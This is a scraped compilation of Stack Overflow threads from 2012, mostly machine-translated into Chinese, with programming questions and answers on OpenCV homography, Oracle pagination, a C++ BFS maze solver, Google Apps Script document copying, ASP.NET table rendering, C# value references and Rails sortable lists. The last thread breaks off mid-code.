> 时间：2012-11-04T19:14:48.277
> 
> 标签：opencv, distortion, homography

我正在开发一个程序，我收到两张相同场景的图片，但其中一张有失真：

```
Mat img_1 = imread(argv[1], 0);  // nORMAL pICTURE
Mat img_2 = imread(argv[2], 0);  // PICTURE WITH DISTORTION 
```

我想评估失真的模式并能够补偿它

我已经能够找到关键点，我想知道我是否可以为此使用函数 cv::findHomography ...无论如何，该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T20:54:41.600

单应性将一个图像平面映射到另一个图像平面。这意味着如果您的失真可以表示为 3x3 矩阵，那么 findHomography 就是您想要的。如果不是，那么这不是你想要的。它将对应点的两个向量作为输入，并将返回最能代表这些点之间变换的 3x3 矩阵。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T17:37:22.160

好的，所以假设我有两张图片（A 和 B）与另一张略有失真，它们之间存在平移、旋转和比例差异（例如，这些图片:)

![原版莉娜](../Images/81d03af143ecefe5d490dee440a01151.png) ![扭曲的莉娜](../Images/10ebf3a72e8d206670fb2b6005d582d0.png)

* * *

Ssoooooooo 我需要的是在图片 B 中应用一种转换，以便补偿存在的失真/平移/旋转，以使两张图片具有相同的大小、方向且没有平移

我已经提取了点并找到了 Homography，如下所示。但我不知道如何使用 Homography 进行转换`Mat img_B`，所以它看起来像`Mat img_A`. 任何的想法？

```
//-- Localize the object from img_1 in img_2
std::vector<Point2f> obj;
std::vector<Point2f> scene;

for (unsigned int i = 0; i < good_matches.size(); i++) {
    //-- Get the keypoints from the good matches
    obj.push_back(keypoints_object[good_matches[i].queryIdx].pt);
    scene.push_back(keypoints_scene[good_matches[i].trainIdx].pt);
}

Mat H = findHomography(obj, scene, CV_RANSAC); 
```

干杯，

# oracle - 甲骨文和分页

> ID：13221912
> 
> 赞同：5
> 
> 时间：2012-11-04T19:15:23.997
> 
> 标签：oracle, hibernate, oracle10g, pagination, top-n

在 MySql 中，分页的概念可以很容易地通过使用如下`LIMIT`子句的单个 SQL 语句来实现。

```
SELECT country_id, country_name 
FROM country c 
ORDER BY country_id DESC 
LIMIT 4, 5; 
```

它将检索SQL 查询检索的结果集中从`5`to开始的行。`10`

* * *

在 Oracle 中，可以使用带有子查询的*行号*来实现同样的事情，这使得任务有点乏味，如下所示。

```
SELECT country_id, country_name
FROM
  (SELECT rownum as row_num, country_id, country_name
   FROM
    (SELECT country_id, country_name
     FROM country
     ORDER BY country_id desc)
  WHERE rownum <= 10
  )
WHERE row_num >=5; 
```

在 Oracle 10g（或更高版本，但我不确定更高版本）中，这可以稍微简单一些，例如，

```
SELECT country_id, country_name
  FROM (SELECT country_id, country_name, row_number() over (order by country_id desc) rank
      FROM country)
 WHERE rank BETWEEN 6 AND 10; 
```

* * *

对于像 Web 应用程序这样的应用程序，几乎在任何地方都需要实现分页的概念，并且每次执行（选择）查询时编写这样的 SQL 语句有时是一项乏味的工作。

假设，我有一个使用 Java 的 Web 应用程序。如果我使用 Hibernate 框架，那么有一种直接的方法可以使用 Hibernate 支持的一些方法，例如，

```
List<Country>countryList=session.createQuery("from Country order by countryId desc")
.setFirstResult(4).setMaxResults(5).list(); 
```

但是当我简单地使用与 Oracle 的 JDBC 连接时，

```
String connectionURL = "jdbc:oracle:thin:@localhost:1521:xe";
Connection connection = null;
Statement statement = null;
ResultSet rs = null;

Class.forName("oracle.jdbc.OracleDriver").newInstance();
connection = DriverManager.getConnection(connectionURL, "root", "root");
statement = connection.createStatement();
rs = statement.executeQuery("SELECT * from country"); 
```

在这种情况下，我的问题是，是否有一种精确的方法可以使用此代码检索指定范围的行？就像在前面的例子中使用类似`setFirstResult()`and的方法一样`setMaxResults()`？或者实现这一点的唯一方法是使用指定的那些子查询。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T19:30:05.920

因为“不”也是一个答案：

不幸的是，您将不得不使用子查询方法。我个人会使用具有排名的那个（第二个）。

# c++ - BFS迷宫帮助c++

> ID：13221915
> 
> 赞同：2
> 
> 时间：2012-11-04T19:15:34.233
> 
> 标签：c++, breadth-first-search, maze

我正在尝试使用广度优先搜索制作迷宫求解器，并使用字符“*”标记最短路径

迷宫实际上只是一堆文字。迷宫由一个 nxn 网格组成，由作为墙壁的“#”符号和句点“.”组成。代表可步行区域/路径。“S”表示开始，“F”表示结束。现在，这个函数似乎没有找到解决方案（它认为它有解决方案，即使是不可能的）。我正在检查四个邻居，如果它们是“未找到”（-1），它们将被添加到要处理的队列中。

迷宫适用于几个迷宫，但不适用于这个：

```
...###.#.... 
##.#...####.
...#.#.#....
#.####.####.
#F..#..#.##.
###.#....#S.
#.#.####.##.
....#.#...#.
.####.#.#.#.
........#... 
```

我的逻辑中可能缺少什么？

```
int mazeSolver(char *maze, int rows, int cols)
{
int start = 0;
int finish = 0;
for (int i=0;i<rows*cols;i++) {
    if (maze[i] == 'S') { start=i; }
    if (maze[i] == 'F') { finish=i; }
}
if (finish==0 || start==0) { return -1; }

char* bfsq;
bfsq = new char[rows*cols]; //initialize queue array
int head = 0;
int tail = 0;
bool solved = false;
char* prd;  
prd = new char[rows*cols]; //initialize predecessor array
for (int i=0;i<rows*cols;i++) {
    prd[i] = -1;
}
prd[start] = -2; //set the start location
bfsq[tail] = start;
tail++;

int delta[] = {-cols,-1,cols,+1};   // North, West, South, East neighbors

while(tail>head) {
    int front = bfsq[head];
    head++;
    for (int i=0; i<4; i++) {
        int neighbor = front+delta[i];
        if (neighbor/cols < 0 || neighbor/cols >= rows || neighbor%cols < 0 || neighbor%cols >= cols) {
            continue;
        }
        if (prd[neighbor] == -1 && maze[neighbor]!='#') {
            prd[neighbor] = front;
            bfsq[tail] = neighbor;
            tail++;
            if (maze[neighbor] == 'F') { solved = true; }
        }   
    }
}

if (solved == true) {   
    int previous = finish;
    while (previous != start) {
        maze[previous] = '*';
        previous = prd[previous];
    }
    maze[finish] = 'F';
    return 1;
}
else { return 0; }

delete [] prd;
delete [] bfsq;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:45:48.483

几点评论：

1.  您可以在 C++ 中使用队列容器，它更易于使用
2.  在此任务中，您可以编写如下内容：

> ```
> int delta[] = {-1, cols, 1 -cols}; 
> ```

然后你可以简单地遍历所有四个方面，你不应该复制粘贴相同的代码。

1.  您将遇到数组边界问题。因为你没有检查它。
2.  当你建立完成后，你应该打破循环
3.  在上一个周期中你有一个错误。它将在您所在的所有单元格中打印 * （不仅以最佳方式）。它应该看起来：

> ```
> while (finish != start)
> {
>   maze[finish] = '*';
>   finish = prd[finish];
> }
> maze[start] = '*'; 
> ```

当然这个循环应该在最后一个如果，因为你不知道那一刻你是否到达终点

PS最好清除您在函数中分配的内存

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T20:12:23.377

遍历邻居可以大大简化（我知道这有点类似于 kobra 的建议，但可以进一步改进）。我使用一个移动数组来定义给定移动的 x 和 y 增量，如下所示：

```
int moves[4][2] = {{0,1},{1,0},{0,-1},{-1,0}}; 
```

请注意，它不仅列出了给定单元格的所有可能移动，而且还按顺时针方向列出了它们，这对某些问题很有用。现在要遍历数组，我使用 a`std::queue<pair<int,int> >`这样，当前位置由与其对应的坐标对定义。这是我如何循环通过一个 gien 细胞 c 的邻居：

```
pair<int,int> c;
for (int l = 0;l < 4/*size of moves*/;++l){
  int ti = c.first + moves[l][0];
  int tj = c.second + moves[l][1];
  if (ti < 0 || ti >= n || tj < 0 || tj >= m) {
    // This move goes out of the field
    continue;
  }

  // Do something.
} 
```

我知道这段代码与你的代码并没有真正的关系，但是当我教这类问题时，相信我，当我向他们展示这种方法时，很多学生都非常感激。

现在回到您的问题 - 您需要从结束位置开始并使用 prd 数组查找其父级，然后找到其父级的父级，依此类推，直到到达具有负父级的单元格。相反，您所做的会考虑所有已访问的单元格，其中一些单元格不在从`S`到的最短路径上`F`。

设置后可以中断，`solved = true`这会稍微优化算法。

我个人认为你总能找到解决方案，因为你没有检查从现场摔倒。（`if (ti < 0 || ti >= n || tj < 0 || tj >= m)`我的代码中的那个位）。

希望这对您有所帮助，并为您提供一些如何改进编码的提示。

# google-apps-script - 用于自动制作 Google 文档副本以供编辑的脚本

> ID：13221922
> 
> 赞同：17
> 
> 时间：2012-11-04T19:16:21.713
> 
> 标签：google-apps-script, google-drive-api, google-docs, google-docs-api

我觉得在这里发帖完全是个菜鸟。我非常了解 CSS、HTML 和 XML，但一直避免使用 JS。我对 javascript 知之甚少，最近开始了 Lynda.com 课程来赶上。对不起我的无知。因此，我真的很难学习 Google Apps 脚本。显然，我需要先学习 JS，然后才能理解其中的任何内容。

我工作的学校（5000 名学生）设置了在线课程。我以数千个谷歌文档工作表的形式创建了课程。这些工作表链接在各种网站上。

我们面临的问题是，当学生打开文档时，他们必须先复制它们才能编辑它们（我当然不希望他们能够编辑原件）。这对于在平板电脑上使用移动浏览器的学生来说真的很糟糕，因为在移动设备上使用桌面 UI 时，在 Google Docs 中制作副本并不能很好地工作。

我知道这种事情可以用脚本自动化。我看过[这里](https://developers.google.com/drive/v2/reference/files/copy)，低头看，它有效！三年来我一直在寻找这样的功能，我高兴得尿了裤子。（是的，我知道这很可悲）。

所以，我要问的是，**是否有人愿意帮助菜鸟弄清楚如何调整此代码，以便学生单击网站课程上的按钮，它会自动制作并在新选项卡中打开工作表的副本？**

```
/**
 * Copy an existing file.
 *
 * @param {String} originFileId ID of the origin file to copy.
 * @param {String} copyTitle Title of the copy.
 */
function copyFile(originFileId, copyTitle) {
  var body = {'title': copyTitle};
  var request = gapi.client.drive.files.copy({
    'fileId': originFileId,
    'resource': body
  });
  request.execute(function(resp) {
    console.log('Copy ID: ' + resp.id);
  });
} 
```

昨天花了一整天的时间学习 Javascript，我还有很长的路要走。不知道我需要多长时间才能自己解决这个问题。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-06T01:23:07.017

您当然可以使用 Apps 脚本来做到这一点。只需要几行。事实上，你可以只使用我在下面写的版本。

这是我的做法 -

1.  确保您的原始文档至少已为将要访问它的人启用。

    ![访问权限](../Images/bec5a7505abdf09171c9755e3092e843.png)

2.  从 URL 中获取 fileId -

    ![在此处输入图像描述](../Images/7dbb74f85681871ff695b5be8bc03187.png)

3.  使用以下代码在 Apps 脚本中编写[Web 应用程序 -](https://developers.google.com/apps-script/execution_web_apps)

    ```
    function doGet(e) {
      //file has to be at least readable by the person running the script
      var fileId = e.parameters.fileId;  
      if(!fileId){
        //have a default fileId for testing. 
        fileId = '1K7OA1lnzphJRuJ7ZjCfLu83MSwOXoEKWY6BuqYitTQQ'; 
      }
      var newUrl = DocsList.getFileById(fileId).makeCopy('File copied to my drive').getUrl(); 
      return HtmlService.createHtmlOutput('<h1><a href="'+newUrl+'">Open Document</a></h1>');
    } 
    ```

4.  将其部署为以访问应用程序的人的身份运行。

    ![部署设置](../Images/2771d849c7ba0bf34d311029238569d9.png)

要记住的关键一件事是，由 Apps 脚本构建的网络应用程序不能强制自动打开一个新窗口。相反，我们可以在编辑模式下显示一个可点击进入文档的链接。

您可以在这里看到它的实际效果（将创建一些虚拟文件） -

[https://script.google.com/macros/s/AKfycbyvxkYqgPQEb3ICieywqWrQ2-2KWb-V0MghR2xayQyExFgVT2h3/exec?fileId=0AkJNj_IM2wiPdGhsNEJzZ2RtZU9NaHc4QXdvbHhSM0E](https://script.google.com/macros/s/AKfycbyvxkYqgPQEb3ICieywqWrQ2-2KWb-V0MghR2xayQyExFgVT2h3/exec?fileId=0AkJNj_IM2wiPdGhsNEJzZ2RtZU9NaHc4QXdvbHhSM0E)

您可以通过放入自己的`fileId`.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-04-09T07:19:49.830

由于`DocsList`已弃用，目前您可以使用以下代码复制文件：

```
File file=DriveApp.getFileById(fileId).makeCopy(fileName, folder); 
```

如Arun Nagarajan的[回答](https://stackoverflow.com/a/13243070/3599535)`fileId`中所述，可以在哪里获得。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-04-03T05:01:48.327

这是正确执行此操作的代码（适用于 2019,2020,2021）：

```
/**
 * Create custom menu when document is opened.
 */
function onOpen() {
  DocumentApp.getUi()
    .createMenu('For Students')
    .addItem('Make a copy', 'makeACopy')
    .addToUi();
}

function makeACopy() {
  var templateId = DocumentApp.getActiveDocument().getId();
  DriveApp.getFileById(templateId).makeCopy();
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-09-16T18:05:21.387

自 2015 年起更新，[Google Script](https://developers.google.com/apps-script/sunset)出于未知原因删除了 fileId。之前将“/copy”附加到 Google 文档的 URL 的方法已重新启用。例如）[https://docs.google.com/document/d/1GTGuLqahAKS3ptjrfLSYCjKz4FBecv4dITPuKfdnrmY/**复制**](https://docs.google.com/document/d/1GTGuLqahAKS3ptjrfLSYCjKz4FBecv4dITPuKfdnrmY/copy)

# jquery - jQuery 移动处理程序不评估动态数据

> ID：13221923
> 
> 赞同：0
> 
> 时间：2012-11-04T19:16:24.277
> 
> 标签：jquery, jquery-mobile

我试图了解如何将 DOM 数据动态传递给事件处理程序。所以，如果我有以下内容：

```
$('section[data-role="page"]').live("pageshow", function(event, ui){
    console.log("pageshow");  
    console.log("$('#audio-language').html());
}); 
```

并且`div`由 jQuery mobile 动态更改，如下所示：

```
<section data-role="page">
  <div id="audio-language">{{language}}</div>
</section> 
```

我的期望是 $('#audio-language').html() 会看到页面中的更改，但事实证明它只在加载第一个 jquery 移动页面时看到 div 中的值。

# c# - 动态 html 通过 C# 呈现带有数据的表的意外行为

> ID：13221925
> 
> 赞同：3
> 
> 时间：2012-11-04T19:16:42.903
> 
> 标签：c#, javascript, asp.net, dynamic-tables

我遇到了一个不熟悉的功能问题。我认为它与循环的范围以及渲染页面时的服务器端代码操作/操作有关。

假设我想重复一个表行 - 每个都承载一个文本输入，行及其文本框根据 DATABASE“绑定”数据的内容使用值呈现。

在添加更多要求之前，一切都运行良好 - 只读属性和事件键（javascript 小型验证任务）。

否则它确实有效，通过两个分隔的字符串交替行另一个属性作为字符串。

如果字符串为空，则如果满足条件，则元素“声明”的结尾部分将为空，然后为该字符串分配值“ReadOnly”，并为 js 字符串分配按键事件“调用功能代码”。

这是代码。这种情况很奇怪，因为`style`属性、当前列的信息、列名，一切都按预期运行，但那两个`READONLY`Attribute 和`event`Key（javascript 小型验证任务）却没有。

## 渲染动态表格代码

这是前面的代码，后面主要使用c#代码（尽可能保留一点代码客户端）

```
`ControlsInteraction.WithTable.Design()` 
```

和

```
`ControlsInteraction.WithTable.ExtractData()` 
```

正在处理列名称和值的呈现和翻译的动态功能

```
int count = 0;
bool TblOk = DebugTests.Sesseion.SeSn.Raised(DebugTests.Flag.HT_DB_CPA_Table_init_Complete);
    if (TblOk)
    {
        string TextBxRendr = "";//holds Renderd <TD> base String-code

        string AltrnatBgColor;
        string NoAttribute = "";
        string Js_NumericKprss = "onkeypress=\"return onlN(event)\""
        string ReadOnly = "READONLY";
        var TimesCol = ALLTablesDataSet.Tables[Tbl1.TableName].Columns;
     string DtrawTbl1 = Tbl1.TableName;
     ControlsInteraction.WithTable.Design Tbldz = 
     new ControlsInteraction.WithTable.Design();

     ControlsInteraction.WithTable.ExtractData DtExtrct =
     new ControlsInteraction.WithTable.ExtractData();

        foreach (System.Data.DataRow TimesRow in ALLTablesSet.Tables[DtrawTbl].Rows)
        {

         AltrnatBgColor= Tbldz.RowsBGColorAlternate(RDE.DataRowToInt(TimesRow, "RecordNum"),true);
         altBgColOnly = Tbldz.RowsBGColorAlternate(RDE.DataRowToInt(TimesRow, "RecordNum"), false);
        Response.Write(string.Format("<tr {0}>",AltrnatBgColor));

                for (int i = 0; i < TimesRow.ItemArray.Length; i++)
                {
                        if (i != (TimesRow.ItemArray.Length - 1))
                        {

                        Js_NumericKprss = "onkeypress=\"return onlN(event)\"";

                   //asking for: current row will Not be read only via its name
                   if (DtExtrct.CurrRowIs(TimesRow, MyDBSchema.DBs_Cols.TblCPAReport.Comments, DtExtrct.DataRowToInt(TimesRow, "RecordNum")))
                                Js_NumericKprss = NoAttribute; // same goes with the other manipulation i've needed to implement on each column
                        TextBxRendr = string.Format(
                        "<td><input type='text' id=\"{0}_{1}\" value=\"{2} \" style=\"width:50px;{3} border:none; \" class=\"RepTblDataTDs\" {4} {5} \\></td>", 
                        TimesCol[i], TimesRow["RecordNum"], TimesRow[i], AltrnatBgColor,Js_NumericKprss,ReadOnly
                                                    );

                        }

                        else
                        {
                        TextBxRendr = string.Format(
        "<td><input type='image' id=\"{0}_{1}\" src=\"images/Save.png\" style=\"width:25px;{2}\" style=\"width:25px\" onclick=\"UbpdateTblCPA(this, {1});\" /></td>",
            "img",i + 1, AltrnatBgColor
                            );
                          }

                        Response.Write(TextBxRendr);
                        count++;
                 }

        }
} 
```

正确注入和只读部分 READONLY 属性和事件键 - (javascript 小验证任务)

要么全部起作用，要么都不起作用

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T15:31:07.190

最终回答我自己的问题的答案是

...好吧一切，包括@Patrics 评论错误

我只能说要好好注意：如何使用 DataTable DataRow、DataTable DataColumns 以及关系 for 和 foreach 变量范围在每一行使用你的可视化 sudio 调试器来检查你的代码值

我没有时间重命名变量，但如果你需要从 DB 表中创建一个动态 html 表，这就是方法

```
 foreach (System.Data.DataRow TimesRow in ALLTablesSet.Tables[DrawTbl].Rows)
    {
        recordNum = RDE.DataRowToInt(TimesRow, "RecordNum");
        AltBgCol = Tbldz.RowsBGColorAlternate(RDE.DataRowToInt(TimesRow, "RecordNum"), true);
        altBgColOnly = Tbldz.RowsBGColorAlternate(RDE.DataRowToInt(TimesRow, "RecordNum"), false);
        Response.Write(string.Format("<tr {0}>", AltBgCol));
        for (int i = 0; i < TimesRow.ItemArray.Length; i++)
        {

            if (i != (TimesRow.ItemArray.Length - 1))
            {
                Js_NumericKprss = "onkeypress=\"return onlN(event)\""; ReadOnly = "";
                if (RDE.CurrRowIs(TimesRow, HentalDBSchema.HTDB_Cols.TblTimeCPAReport.Comments, i))
                {
                    Js_NumericKprss = ""; ReadOnly = "";
                }

                else if (RDE.CurrRowIs(TimesRow, HentalDBSchema.HTDB_Cols.TblTimeCPAReport.Fines, i)
                 || RDE.CurrRowIs(TimesRow, MyDBSchema.DBs_Cols.TblCPAReport.PhoneExpences, i)
                 || RDE.CurrRowIs(TimesRow, MyDBSchema.DBs_Cols.TblCPAReport.SalaryPerDay, i)
                 || RDE.CurrRowIs(TimesRow, MyDBSchema.DBs_Cols.TblCPAReport.SalaryPerMonth, i)
                 || RDE.CurrRowIs(TimesRow, MyDBSchema.DBs_Cols.TblCPAReport.TotalGrossWages, i)
                 || RDE.CurrRowIs(TimesRow, MyDBSchema.DBs_Cols.TblCPAReport.TravelFee, i))
                {
                    ReadOnly = "";
                    Js_NumericKprss = "onkeypress=\"return onlN(event)\"";
                }
                else
                    ReadOnly = "READONLY";

                TxtRndr = string.Format("<td><input type='text' id=\"{0}_{1}\" value=\"{2} \" style=\"width:50px;{3} border:none; \" class=\"RepTblDataTDs\" {5} {6} \\></td>{4}", TimesCol[i], TimesRow["RecordNum"], TimesRow[i], altBgColOnly, Environment.NewLine + "\t\t\t", Js_NumericKprss, ReadOnly);
            }

            else
            {
                TxtRndr = string.Format("<td><input type='image' id=\"{0}_{1}\" src=\"images/Save.png\" style=\"width:25px;{3}\" style=\"width:25px\" onclick=\"UbpdateTblCPA(this, {1});\" /></td>{4}", "imgBut", i + 1, TimesRow[i], altBgColOnly, Environment.NewLine + "\t\t\t");
            }

            Response.Write(TxtRndr);

            count++;
        }

    } 
```

我正在添加我所做的所有研究，以便更容易`data`提取以及我研究过的更多方法，所以如果你喜欢使用它，请随意...

```
 public class ControlsInteraction
    {
        public class WithDDL
        {
            public class GetSelVal
            {
                public string AsString(DropDownList DDLToCollectValusFrom)
                {

                    return DDLToCollectValusFrom.SelectedValue;
                }
                public int AsInt(DropDownList DDLToCollectValusFrom)
                { 
                    if(DDLToCollectValusFrom.SelectedValue != null)
                    return Convert.ToInt32(DDLToCollectValusFrom.SelectedValue);
                    return 666;
                }
            }
            public List<string> GetListItems_Values(DropDownList DDLToCollectValusFrom)
            {
                List<string> LST_DDLValues = new List<string>();
                foreach (ListItem item in DDLToCollectValusFrom.Items)
                {
                    LST_DDLValues.Add(item.Value);

                }
                return LST_DDLValues;
            }
            public List<string> GetListItems_Text(DropDownList DDLToCollectTextFrom)
            {
                List<string> LST_DDLTEXT = new List<string>();
                foreach (ListItem item in DDLToCollectTextFrom.Items)
                {
                    LST_DDLTEXT.Add(item.Text);

                }
                return LST_DDLTEXT;
            }
        }
        public static class WithPlcHldr
        {
            public static void AddCtrl(PlaceHolder PlcHldrID, Control CntrID)
            {
                PlcHldrID.Controls.Add(CntrID);
            }
        }
        public class WithTable
        {
            public class Design
            {
                public string RowsBGColorAlternate(int RowCounter, bool AddWithStyleAsStandAlone = false)
                {
                    string BgCol = ""; bool bgclaltrnator;
                    if (RowCounter > 0)
                    {
                        RowCounter++;
                        bgclaltrnator = (RowCounter % 2) == 0;
                        if (bgclaltrnator)
                            BgCol = "#70878F";
                        else BgCol = "#E6E6B8";
                    }
                    if (AddWithStyleAsStandAlone)
                    return string.Format("style=\"background-color:{0};\"", BgCol);
                    return string.Format("background-color:{0};", BgCol);
                }
            }
            public class ExtractData
            {
                public string ColumnValueFromCurrRow(DataRow DtRow, string RequestedColName)
               {
                    return "";
                }
                public string DataRows_ColumnToString(DataRow Data_RowToActOn, string keyColName)
                {
                    var tmp = Data_RowToActOn[keyColName];
                    return Data_RowToActOn[keyColName].ToString();

                }
                public int DataRowToInt(DataRow Data_RowToActOn, string keyColName)
                {
                    string tmp = Data_RowToActOn[keyColName].ToString();
                    return Convert.ToInt32(tmp);

                }
                public bool CurrColumnIs(DataColumn Data_RowToQuestion, string ColumnName)
                {
                    string tmp = Data_RowToQuestion.ToString();
                    return tmp == ColumnName;
                }
                public bool CurrRowIs(DataRow Data_RowToQuestion, string RowName, int CurrIndex)
                {
                    string ColsName = Data_RowToQuestion.Table.Columns[CurrIndex].ToString();
                    return ColsName == RowName;
                    //this is curent value - by index 

                    //string currentColumn = Data_RowToQuestion.ItemArray[CurrIndex].ToString();

                }
            }

        }
    } 
```

# c# - 在 C# 中通过引用使用双精度

> ID：13221936
> 
> 赞同：2
> 
> 时间：2012-11-04T19:18:01.667
> 
> 标签：c#, reference

假设我有一个监控双精度值的类。我不想在每次调用监控类中的监控方法时都传递那个双精度值。因此，我想在构造函数中传递一个对double的引用，并将其存储起来，这样我就可以直接在monitor方法中比较值。

我的尝试是：

```
class Monitor {
    double v;
    public Monitor(ref double x) { v = x; }
    public watch() { Console.WriteLine("Value is: " + v); }
} 
```

并将其用于：

```
double d = 10;
Monitor m = new Monitor(ref d);
while (d > 0) {
  m.watch();
  d--;
} 
```

不幸的是，这不起作用，因为 Monitor 构造函数中的赋值将值存储在 v 变量中。我试图将变量声明为，`ref double v`但 ref 只能在方法参数中使用。

该提案附近是否有任何解决方案不包括装箱/拆箱或`d`在每次调用时传递值`watch`？

谢谢

**注意：**我想使用它的具体情况与上面的代码无关。这只是一种轻松展示我想要实现的目标的方式。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T19:33:41.380

简短的回答是您不能存储对双精度（或任何其他值类型）的引用。引用只能传递给方法（不存储在调用之间）。

长答案是，您可以将它包装在这样的类中并传递该类：

```
class DoubleWrap
{
    protected double val;

    public DoubleWrap(double _val) { val = _val; }
    public double Value { get { return val } set { val = value; } }
} 
```

然后当你使用它时：

```
class Monitor {
    DoubleWrap v;
    public Monitor(DoubleWrap x) { v = x; }
    public watch() { Console.WriteLine("Value is: " + v.Value); }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:42:14.470

请注意，编译器必须做*一些*特殊的提升，但我不确定声明为结构类型的局部变量是什么/如何！（也就是说，我没有声称缺少开销。）

但是，我确实喜欢闭包并且发现这是“不那么侵入性”，所以：

```
class Monitor {
    Func<double> v;
    public Monitor(Func<double> x) { v = x; }
    public watch() { Console.WriteLine("Value is: " + v()); }
}

double d = 10;
Monitor m = new Monitor(() => d);
while (d > 0) {
  m.watch();
  d--;
} 
```

* * *

`ref/out` *参数*（它不是通用类型属性）必须*始终*引用有效变量（让我们忽略 VB.NET 的属性技巧），因此这些属性*不能*应用于外部（成员）变量：

在编译时可以确保这种“引用有效变量”语义的唯一方法是限制`ref/out`在当前调用框架中使用语义 - 读取：在方法主体中 - 作为具有“引用变量”的调用框架保证存在。`ref/out`由于这个原因，甚至不能在嵌套的闭包/委托/lambdas中使用；它们可能会从当前调用框架中提升/调用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-12-09T21:08:39.277

如果要传递对内在值类型的引用，请创建一个长度为 1 的数组。所有数组都是引用类型。

```
 class A {
        private double[] sharedDbl;
        public A(double[] d) {
            sharedDbl = d;
        }
    }

    class Program {
        public static void Main() {
            // other code
            double[] shared = new double[1];
            A a1, a2;

            shared[0] = 34.55d;
            a1 = new A(shared);
            a2 = new A(shared);
        // Now both a1 and a2 have a reference to the same double value.
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T20:20:23.943

由于您正在尝试跟踪变量是否更改，因此更好的做法是在恕我直言时将您的变量包装在一个可观察的变量中，而不是轮询它。然后，您可以在变量更改时接收事件。当然，您必须更改从变量中读取和写入的方式。

```
public class ObservableObject<T>
        : INotifyPropertyChanging, INotifyPropertyChanged
{
    public ObservableObject(T defaultValue = default(T),
                            IEqualityComparer<T> comparer = null)
    {
        this.value = defaultValue;
        this.comparer = comparer ?? EqualityComparer<T>.Default;
    }

    private T value;
    private IEqualityComparer<T> comparer;
    public T Value
    {
        get { return value; }
        set
        {
            if (!comparer.Equals(this.value, value))
            {
                OnValueChanging();
                this.value = value;
                OnValueChanged();
            }
        }
    }

    public event PropertyChangingEventHandler PropertyChanging;
    protected virtual void OnValueChanging()
    {
        var propertyChanging = PropertyChanging;
        if (propertyChanging != null)
            propertyChanging(this, new PropertyChangingEventArgs("Value"));
    }

    public event PropertyChangedEventHandler PropertyChanged;
    protected virtual void OnValueChanged()
    {
        var propertyChanged = PropertyChanged;
        if (propertyChanged != null)
            propertyChanged(this, new PropertyChangedEventArgs("Value"));
    }
} 
```

然后你可以这样做：

```
var d = new ObservableObject<double>(10);
d.PropertyChanged += (o, e) =>
{
    var obs = (ObservableObject<double>)o;
    Console.WriteLine("Value changed to: {0}", obs.Value);
};
Console.WriteLine("Value is: {0}", d.Value);
d.Value = 20;
Console.WriteLine("Value is: {0}", d.Value); 
```

# jquery - Drag and drop sorting with multiple models rails

> ID：13221942
> 
> 赞同：0
> 
> 时间：2012-11-04T19:18:55.627
> 
> 标签：jquery, ruby-on-rails, post, views

I have a simple rails todo list running. I have 2 relevant models, `List` and `Task`.

A `List` obviously `has_many :tasks` and now I am trying to use jQuery drag and drop to sort the position of incomplete tasks in the show view of the List and have the position order remain after a page load.

I believe the issue may be in the url I'm passing to my lists.js.coffee.

The output after a drag and drop-

```
Started POST "/lists/1/tasks/sort" for 127.0.0.1 at 2012-11-04 11:08:37 -0800
Processing by TasksController#sort as */*
  Parameters: {"list_id"=>"1"}
  List Load (0.2ms)  SELECT "lists".* FROM "lists" WHERE "lists"."id" = ? LIMIT 1  [["id", "1"]]
  Rendered text template (0.0ms)
Completed 200 OK in 5ms (Views: 1.7ms | ActiveRecord: 0.2ms) 
```

My routes-

```
 resources :lists do
    resources :tasks do
      collection { post :sort }
    end
  end 
```

My lists.js.coffee-

```
jQuery ->
  $('#incomplete').sortable
    axis: 'y'
    update: ->
     $.post($(this).data('update-url'), $(this).sortable('serialize')) 
```

My task controller-

```
class TasksController < ApplicationController
  before_filter :find_list
  respond_to :html, :js

  def index
    @task = List.tasks.incomplete.order("position")
  end

  def sort
    render nothing: true
  end

  def create
    @task = @list.tasks.new(params[:task])
    if @task.save
      flash[:notice] = "Task Created"
    else
      flash[:error] = "It just didn't happen for you"
    end

    respond_with @list
  end

  def complete
    @task = @list.tasks.find(params[:id])

    @task.update_attributes({ 
      completed: true
    })

    respond_with @list
  end

  private

  def find_list
    @list = List.find(params[:list_id])
  end
end 
```

And finally the show view of the List where I'm rendering complete and incomplete tasks-

```
<ul class="task-list" id="incomplete" data-update-url="<%= sort_list_tasks_url(@list)%>">
    <% @list.tasks.incomplete.each do |task| %> 
     <table class="table table-hover table-condensed">
       <tbody>
         <tr>
           <td>
            <li id="task-<%= task.id %>">
              <span class="task-description" id="description-<%= task.id %>">
                <%= image_tag task.user.gravatar_url, :class => "gravatar_index" %>
                <%= task.description %>
              </span>
              <span class="pull-left" id="completed_checkbox">
               <%= button_to "Completed", complete_task_path(@list.id,task.id), :class => "btn-mini", remote: true %>
              </span>
            </li>
          </td>
         </tr>
       </tbody>
      </table>
    <% end %> 
```

I have been following Rbates tutorial [that handles only one faq model](http://railscasts.com/episodes/147-sortable-lists-revised?), so I am missing the connection in how to make it work across both. After more than a couple hours I've become stuck. Thanks for taking a look and your attention.

* * *

## **[UPDATE]**

I believe I have made progress in moving some of the logic into my lists controller and cleaning up the list show view-

lists controller-

```
 def show
    @list = List.find(params[:id])  
    @tasks = @list.tasks.incomplete.order("position")
  end

  def sort
    render nothing: true
  end 
```

List show view-

```
<ul class="task-list" id="incomplete" data-update-url="<%= sort_list_tasks_url %>">
    <% @tasks.each do |task| %> 
     <table class="table table-hover table-condensed">
       <tbody>
         <tr>
           <td>
            <%= content_tag_for :li, task do %>
              <span class="task-description" id="description-<%= task.id %>">
                <%= image_tag task.user.gravatar_url, :class => "gravatar_index" %>
                <%= task.description %>
              </span>
